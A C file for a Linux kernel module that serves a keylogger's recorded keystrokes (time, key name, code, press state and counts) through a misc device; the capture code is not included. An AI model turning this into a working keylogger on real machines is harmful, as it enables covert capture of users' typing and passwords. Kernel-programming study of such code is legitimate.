#include "keylog.h"

extern struct s_keyboard_map keyboard_mapping[];

LIST_HEAD(head_stroke_lst);
DEFINE_SPINLOCK(lock);

int keylog_show(struct seq_file *seq_file, void *p)
{
	struct s_stroke	*strokes = NULL;

	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		seq_printf(seq_file, "%.2i:%.2i:%.2i: %s (%d) %s - %li\n",
			   strokes->time.tm_hour,
			   strokes->time.tm_min,
			   strokes->time.tm_sec,
			   strokes->name,
			   strokes->key,
			   strokes->state == RELEASED ? "RELEASED" : "PRESSED",
			   strokes->state ? keyboard_mapping[strokes->key].nb_pressed : keyboard_mapping[strokes->key].nb_released
			   );
	}
	return 0;
}

static int keylog_open(struct inode *inode, struct file *file)
{
	int ret;

	spin_lock(&lock);
	file->private_data = NULL;
	ret = single_open(file, &keylog_show, NULL);
	spin_unlock(&lock);
	return ret;
}

static ssize_t	keylog_write(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	return 0;
}

static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	int	ret;

	spin_lock(&lock);
	ret = seq_read(file, buf, size, offset);
	spin_unlock(&lock);
	return ret;
}

static int keylog_release(struct inode *inode, struct file *file)
{
	int	ret;

	spin_lock(&lock);
	ret = single_release(inode, file);
	spin_unlock(&lock);
	return ret;
}

static struct file_operations const keylog_file_fops = {
	.owner		= THIS_MODULE,
	.open = keylog_open,
	.write = keylog_write,
	.read = keylog_read,
	.release = keylog_release,
	.llseek = seq_lseek,
};

struct miscdevice		keylog_dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&keylog_file_fops
};

EXPORT_SYMBOL(head_stroke_lst);
EXPORT_SYMBOL(keylog_dev);
